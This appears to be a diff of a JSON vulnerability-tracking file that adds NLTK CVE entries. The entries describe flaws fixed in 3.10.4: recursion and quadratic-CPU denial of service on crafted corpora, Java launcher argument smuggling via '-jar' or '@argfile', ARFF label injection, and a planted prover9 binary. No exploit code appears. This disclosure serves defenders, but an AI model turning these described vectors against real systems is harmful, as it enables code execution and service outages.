+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. From 3.10.3 until 3.10.4, the NLTK 3.10.3 JVM hardening validates Java launcher tokens in the options channel but appends the caller-controlled cmd sequence without requiring its first token to be a main class. Supplying -jar or an @argfile through nltk.internals.java or StanfordSegmenter.java_class can therefore execute attacker-selected Java bytecode without the unsafe-JAR opt-in. This issue is fixed in version 3.10.4.",
+                "severity": "CRITICAL",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-128139": {
+                "cve_id": "CVE-2026-128139",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. From 3.6 to 3.10.3, XMLCorpusView._read_xml_fragment accumulates 1 KiB blocks and repeatedly applies whole-buffer XML validation while a comment or CDATA terminator remains ahead. A large comment in an attacker-controlled corpus file causes quadratic CPU consumption through documented XML corpus readers across the affected range. On 3.6 and 3.9.2, a large CDATA section incurs the quadratic scan before rejection, while on 3.10.3 both comment and CDATA documents are read successfully. This vulnerability is fixed in 3.10.4.",
+                "severity": "HIGH",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-128140": {
+                "cve_id": "CVE-2026-128140",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. From 3.6.7 until 3.10.4, nltk.downloader follows collection membership without tracking already visited collection nodes. A self-referencing or mutually referencing collection index can therefore make the package-closure walk loop indefinitely while its queue and memory usage grow, denying service when a victim processes the attacker-influenced index. This issue is fixed in version 3.10.4.",
+                "severity": "MEDIUM",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
             "CVE-2026-12841": {
                 "cve_id": "CVE-2026-12841",
                 "title": "[Unknown description]",
@@ -1185,9 +1523,191 @@
             },
             "CVE-2026-12876": {
                 "cve_id": "CVE-2026-12876",
-                "title": "Title Not Available",
-                "description": "Description Not Available",
+                "title": "[Unknown description]",
+                "description": "[Unknown description]",
                 "severity": "LOW",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-129221": {
+                "cve_id": "CVE-2026-129221",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. Prior to 3.10.4, nltk.classify.weka.ARFF_Formatter writes attacker-controlled class labels into the Weka ARFF @ATTRIBUTE '-label-' declaration without safely formatting the label tokens. Crafted labels can alter the generated ARFF schema or records, corrupting classifier input and causing integrity loss or processing failure. This issue is fixed in version 3.10.4.",
+                "severity": "MEDIUM",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-129222": {
+                "cve_id": "CVE-2026-129222",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. Prior to 3.10.4, DependencyGraph.tree and DependencyGraph.triples walk parsed dependency edges through unbounded Python recursion and do not use a working cycle or depth guard. A crafted CoNLL or Malt-TAB dependency file containing a sufficiently long chain can raise RecursionError when the documented traversal APIs are called, aborting the current worker. This issue is fixed in version 3.10.4.",
+                "severity": "HIGH",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-129223": {
+                "cve_id": "CVE-2026-129223",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. Prior to 3.10.4, WordNet Synset.tree and acyclic_tree traverse relation graphs through recursive utility helpers without a depth bound. Exploitation requires the host application to load an attacker-influenced custom or foreign WordNet-format lexical resource; no relation in NLTK's bundled WordNet 3.0 corpus reaches the crash threshold. An excessively deep relation graph in such a resource can exceed the Python recursion limit and terminate the traversal or request worker. This issue is fixed in version 3.10.4.",
+                "severity": "HIGH",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-129224": {
+                "cve_id": "CVE-2026-129224",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. Prior to 3.10.4, the CCG lexicon parser's matchBrackets and augParseCategory functions recursively process nested parenthesized categories without a depth bound. An attacker-controlled lexicon string with excessive nesting can raise RecursionError through nltk.ccg.lexicon.fromstring and terminate the parse operation or request worker. This issue is fixed in version 3.10.4.",
+                "severity": "MEDIUM",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-129225": {
+                "cve_id": "CVE-2026-129225",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. In 3.10.3 and earlier, DependencyGraph._tree and triples recurse once per dependency edge without a depth bound, and get_cycle_path also lacks a visited-set termination guard. A deeply chained or cyclic attacker-controlled CoNLL or Malt-TAB dependency structure can raise RecursionError and abort a parse worker. This issue is fixed in version 3.10.4.",
+                "severity": "MEDIUM",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-129226": {
+                "cve_id": "CVE-2026-129226",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. Prior to 3.10.4, the semantic-logic read_type parser recursively processes both halves of nested complex type strings without applying LogicParser.MAX_PARSE_DEPTH. An attacker-controlled type string or signature with excessive nesting can raise RecursionError through Type.fromstring or type-checking entry points and abort the current worker. This issue is fixed in version 3.10.4.",
+                "severity": "MEDIUM",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-129227": {
+                "cve_id": "CVE-2026-129227",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. Prior to 3.10.4, Tree.fromlist recursively converts nested Python list input into Tree objects without enforcing a maximum tree depth. An attacker-controlled list nested beyond the interpreter recursion limit can raise RecursionError and terminate the current parse operation or request worker. This issue is fixed in version 3.10.4.",
+                "severity": "MEDIUM",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-129228": {
+                "cve_id": "CVE-2026-129228",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. Prior to 3.10.4, ToolboxSettings.parse builds a deeply nested attacker-controlled settings tree iteratively, but the later public helpers to_settings_string, remove_blanks, add_default_fields, sort_fields, and add_blank_lines recursively traverse that tree without a depth bound. Invoking any of those helpers on input nested beyond the interpreter recursion limit can raise RecursionError and abort the operation or request worker. This issue is fixed in version 3.10.4.",
+                "severity": "MEDIUM",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-129229": {
+                "cve_id": "CVE-2026-129229",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. From 3.10.0 until 3.10.4, TokenSearcher.findall and Text.findall accept caller-controlled regular expressions with an unbounded number of capturing groups throughout the affected range. Starting in 3.10.3, nltk.redos.compile and RegexpTokenizer expose the same compile-time vector. The third-party regex engine compiles group-dense patterns with roughly quadratic cost before the match-time timeout begins, allowing a small unauthenticated request to exhaust CPU and deny service. This issue is fixed in version 3.10.4.",
+                "severity": "LOW",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.9.1-2",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-129230": {
+                "cve_id": "CVE-2026-129230",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. Prior to 3.10.4, WordNet Synset.max_depth, min_depth, hypernym_paths, and hypernym_distances recursively follow attacker-controlled corpus pointers without a visited-node set or depth cap. A cyclic or excessively deep hypernym graph can raise RecursionError and terminate traversal APIs and similarity operations that depend on them. This issue is fixed in version 3.10.4.",
+                "severity": "MEDIUM",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-129231": {
+                "cve_id": "CVE-2026-129231",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. Prior to 3.10.4, SeekableUnicodeStreamReader.readline appends each new block to a growing character buffer and reruns splitlines over the entire buffer on every iteration. An attacker-controlled corpus file containing one very long unterminated line therefore causes quadratic CPU consumption in line-oriented corpus readers and can deny service. This issue is fixed in version 3.10.4.",
+                "severity": "MEDIUM",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-129232": {
+                "cve_id": "CVE-2026-129232",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. Prior to 3.10.4, XMLCorpusView.read_block rebuilds the full root-to-node context path with \"/\".join(context) for every start tag while searching for a matching element. Deeply nested attacker-influenced corpus XML therefore causes quadratic pure-Python work and can pin a processing worker, resulting in denial of service. This issue is fixed in version 3.10.4.",
+                "severity": "MEDIUM",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.8-1",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-129233": {
+                "cve_id": "CVE-2026-129233",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. From 3.10.0 until 3.10.4, StreamBackedCorpusView performs os.stat on a caller-supplied plain string path during construction before pathsec containment is enforced. The PathPointer branch used by in-tree corpus readers is validated, so exploitation requires application code to pass an attacker-influenced string directly to the public constructor. That string can identify an out-of-root path and disclose its existence, size, and modification time even though opening the file would be rejected. This issue is fixed in version 3.10.4.",
+                "severity": "LOW",
+                "status": "open",
+                "events": [
+                    {
+                        "introduced": "0:3.9.1-2",
+                        "identifier": "debian"
+                    }
+                ]
+            },
+            "CVE-2026-129234": {
+                "cve_id": "CVE-2026-129234",
+                "title": "NLTK (Natural Language Toolkit) is a suite of open source Python  ...",
+                "description": "NLTK (Natural Language Toolkit) is a suite of open source Python modules, data sets, and tutorials supporting research and development in Natural Language Processing. Prior to 3.10.4, Prover9Parent.config_prover9 and Mace accept a relative binary_location and pass it to find_binary as path_to_bin, disabling the bare-name absolute-path guard. A local attacker who can plant prover9 or mace4 in the resolved working directory can cause subprocess.Popen to execute that binary with the invoking user's privileges. This issue is fixed in version 3.10.4.",
+                "severity": "HIGH",
                 "status": "open",
                 "events": [
                     {
